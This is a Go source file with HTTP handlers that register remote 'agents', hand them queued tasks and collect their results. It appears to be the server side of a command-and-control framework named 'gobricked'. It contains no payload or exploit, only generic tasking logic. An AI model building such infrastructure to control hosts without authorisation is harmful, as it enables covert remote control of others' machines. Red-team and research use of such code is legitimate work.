package router

import (
	"encoding/json"
	"fmt"
	"gobricked/pkg/util"
	"log"
	"net/http"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

func RegisterAgentHandler(w http.ResponseWriter, r *http.Request) {
	var agent util.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		fmt.Printf("error: %v\n", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agentID := uuid.New().String()
	agent.ID = agentID
	agent.LastSeen = time.Now()

	util.Agents[agentID] = agent

	log.Printf("[+] Registered agent %s (%s) from (%s)\n", agentID, agent.Hostname, agent.IP)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agent)
}

func PostResultHandler(w http.ResponseWriter, r *http.Request) {
	var result util.Result
	err := json.NewDecoder(r.Body).Decode(&result)

	if err != nil {
		log.Printf("Decode error: %v\n", err)
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	util.Results = append(util.Results, result)
	//log.Printf("[✓] Received result for task (%s) from agent (%s) > %s", result.TaskID, result.AgentID, result.Output)
	w.WriteHeader(http.StatusCreated)
}

func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
	agentID := mux.Vars(r)["agentID"]

	util.Mutex.Lock()
	defer util.Mutex.Unlock()

	agentTasks := util.Tasks[agentID]
	util.Tasks[agentID] = []util.Task{}

	log.Printf("[>] Agent (%s) pulled (%d) task(s)", agentID, len(agentTasks))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentTasks)
}
